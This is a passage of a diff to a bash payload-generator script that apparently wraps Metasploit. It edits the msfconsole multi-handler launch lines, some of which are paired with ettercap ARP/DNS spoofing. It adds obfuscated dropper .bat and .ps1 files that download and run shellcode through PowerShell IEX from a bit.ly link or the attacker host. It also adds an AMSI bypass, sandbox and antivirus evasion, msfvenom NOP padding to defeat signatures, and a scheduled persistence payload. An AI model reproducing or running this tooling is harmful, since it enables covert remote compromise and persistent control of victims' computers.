-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
           fi
         fi
@@ -2713,7 +2749,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start installer.bat on target every 23 hours" --width 300) > /dev/null 2>&1
 
     cd $IPATH/aux
-    # Build persistence script (AutoRunStart='multi_console_command -rc')
+    # Build persistence script (AutoRunStart='multi_console_command -r')
     cp persistence.rc persistence[bak].rc
     cp persistence2.rc persistence2[bak].rc
     sed -i "s|N4m|$N4m.msi|g" persistence2.rc
@@ -2810,7 +2846,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -2825,7 +2861,7 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -2839,7 +2875,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -2854,7 +2890,7 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
    fi
@@ -2930,7 +2966,7 @@ rm *.vbs > /dev/null 2>&1
 
 # display shellcode
 mv *.bat $IPATH/bin/sedding.raw
-disp=`cat $IPATH/bin/sedding.raw | grep "Shellcode" | awk {'print $8'}`
+disp=`cat $IPATH/bin/sedding.raw | grep "Shellcode" | awk {'print $8'} | tr -d '\n'`
 echo "$disp" > $IPATH/output/chars.raw
 echo ""
 echo "[☠] shellcode -> powershell encoded!"
@@ -2972,14 +3008,30 @@ sleep 2
 cd $IPATH/templates/
 echo "[☠] Injecting shellcode -> $N4m.bat!"
 sleep 2
-sed "s|InJ3C|$disp|g" InvokePS1.bat > $N4m.bat
+
+
+OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1
+if [ "$OBF" = "None-Obfuscation (default)" ]; then
+echo "@echo off&&cmd.exe /c powershell.exe IEX (New-Object system.Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode -Force -Shellcode $disp" > $N4m.bat
+else
+echo "[✔] String obfuscation technic sellected .."
+### TODO: check if connects back..
+# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
+# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
+#
+# STRING: powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode -Force -Shellcode $disp
+echo "@e%!%ch^O Of^f&&@c^Md%i%\".\"e%db%X^e ,/^R ,, =po%$'''!%W^er%,,,%She^ll.E^x%Count+3%e I%pP0%E^X (N%on%e^w-Obj^e%$,,,%ct N%i0%e^t.We^bC%A%lie^n%$'''d%t).Do%pP0%wn^loa%UI%d^Str^i%$'''E%ng('h'+'tt'+'p:'+'//bit.ly/14bZZ0'+'c');In^vo%Id%k%Count+8%e-S%$'''d%hel^l%,,;F%cod^e -For%en%ce -Sh%IN%e^ll%oOp%cod^e $disp" > $N4m.bat
+fi
+
+
+#sed "s|InJ3C|$disp|g" InvokePS1.bat > $N4m.bat
 mv $N4m.bat $IPATH/output/$N4m.bat
 sleep 2
 
 
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
-serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.bat\n\nExecute: press 2 times to 'execute'\n\nchose how to deliver: $N4m.bat" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.bat\n\nchose how to deliver: $N4m.bat" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 240) > /dev/null 2>&1
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
@@ -3016,7 +3068,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.bat on target every 23 hours" --width 300) > /dev/null 2>&1
 
     cd $IPATH/aux
-    # Build persistence script (AutoRunStart='multi_console_command -rc')
+    # Build persistence script (AutoRunStart='multi_console_command -r')
     cp persistence.rc persistence[bak].rc
     sed -i "s|N4m|$N4m.bat|g" persistence.rc
     sed -i "s|IPATH|$IPATH|g" persistence.rc
@@ -3113,7 +3165,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -3128,7 +3180,7 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -3142,7 +3194,7 @@ fi
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -3157,7 +3209,7 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
    fi
@@ -3406,9 +3458,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
 
             cd $IPATH/output
@@ -3427,9 +3479,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           else
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
           fi
 
@@ -3448,7 +3500,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
 
             cd $IPATH/output
@@ -3467,9 +3519,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           else
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
           fi
         fi
@@ -3539,11 +3591,15 @@ cat << !
 
 !
 
+#
 # use metasploit to build shellcode
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw"
+# HINT: use -n to add extra bits (random) of nopsled data to evade signature detection
+#
+KEYID=$(cat /dev/urandom | tr -dc '13' | fold -w 3 | head -n 1)
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 > $IPATH/output/chars.raw"
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw" > /dev/null 2>&1
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd -n $KEYID > $IPATH/output/chars.raw" > /dev/null 2>&1
 fi
 
 # parsing shellcode data
@@ -3580,27 +3636,35 @@ cd $IPATH/output/
 # compiling to ps1 output format
 echo "[☠] Injecting shellcode -> $N4m.ps1!"
 sleep 2
+OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1
+if [ "$OBF" = "None-Obfuscation (default)" ]; then
+echo "Write-Host \"Please Wait, installing software..\" -ForeGroundColor green;powershell.exe -nop -wind hidden -Exec Bypass -noni -enc Sh33L" > payload.raw
+else
+echo "[✔] String obfuscation technic sellected .."
+sleep 2
+echo "[☠] Building $N4m.ps1 agent .."
+# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
+# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
+# HINT: setting -ExecutionPolicy/-ep is redundant since -EncodedCommand/-enc automatically bypasses the execution policy
 #
-# https://artofpwn.com/offensive-and-defensive-powershell-ii.html
-# TODO: echo "powershell.exe -nop -wind \`h\`id\`d\`en -Exec \`B\`yp\`a\`ss -noni -enc Sh33L" > payload.raw
+# STRING: powershell.exe -NoPRo -wIN 1 -nONi -eN Sh33L
+echo "Write-Host \"Please Wait, installing software..\";pi\`ng -n 3 ww\`w.mi\`cro\`sof\`t.co\`m > \$env:tmp\\li\`ce\`nce.p\`em;\$method=(\"{1}{2}{0}\" -f'N','/','e');\$ScriptBlock = \"'Sy?s%t%e??m.Ma%na?geme?nt.Auto?mat?i%o%n.A?msi?U%t%i?ls'\";\$UBlock = \"'am?s%i%?In?it%F?ai?l%e%d'\";\$reg = \$ScriptBlock.Replace(\"?\",\"\").Replace(\"%\",\"\");\$off = \$UBlock.Replace(\"?\",\"\").Replace(\"%\",\"\");[ref].Assembly.GetType(\$reg).GetField(\$off, 'NonPublic,Static').SetValue(\$null,\$true);\$cert=(\"{1}{3}{0}{2}\" -f'N','/n','i','O');Pow\`ers\`hell.e\`Xe /No\`PR\`o  /wI\`N 1 \$cert \$method Sh33L" > payload.raw
+fi
 #
-echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc Sh33L" > payload.raw
+# parsing data
+#
 sed "s|Sh33L|$str0|" payload.raw > $N4m.ps1
 rm $IPATH/output/payload.raw > /dev/null 2>&1
 
 
 # build installer.bat (x86) to call .ps1
-echo "[☠] Building ps1 -> installer.bat..."
+echo "[☠] Building installer.bat dropper .."
 sleep 2
-echo ":: powershell template | Author: r00t-3xp10it" > $IPATH/output/installer.bat
-echo ":: Matthew Graeber - DownloadString" >> $IPATH/output/installer.bat
-echo ":: Download/execute payload in RAM" >> $IPATH/output/installer.bat
-echo ":: ---" >> $IPATH/output/installer.bat
-echo "@echo off" >> $IPATH/output/installer.bat
-echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/installer.bat
-echo "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://$lhost/$N4m.ps1')" >> $IPATH/output/installer.bat
-
-
+if [ "$OBF" = "None-Obfuscation (default)" ]; then
+echo "@echo off&&powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://$lhost/$N4m.ps1')" > $IPATH/output/installer.bat
+else
+echo "@e%!%ch^O Of^f&&@c^Md%i%\".\"e%db%X^e ,/^R ,, =po%$'''!%W^er%,,,%She^ll.E^x%Count+3%e I%pP0%E^X (N%on%e^w-Obj^e%$,,,%ct N%i0%e^t.We^bC%A%lie^n%$'''d%t).Do%pP0%wn^loa%UI%d^Str^i%$'''E%ng('h'+'tt'+'p:'+'//'+'$lhost/$N4m.ps'+'1')" > $IPATH/output/installer.bat
+fi
 
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
@@ -3711,9 +3775,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
 
             cd $IPATH/output
@@ -3732,9 +3796,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           else
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
           fi
 
@@ -3751,9 +3815,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
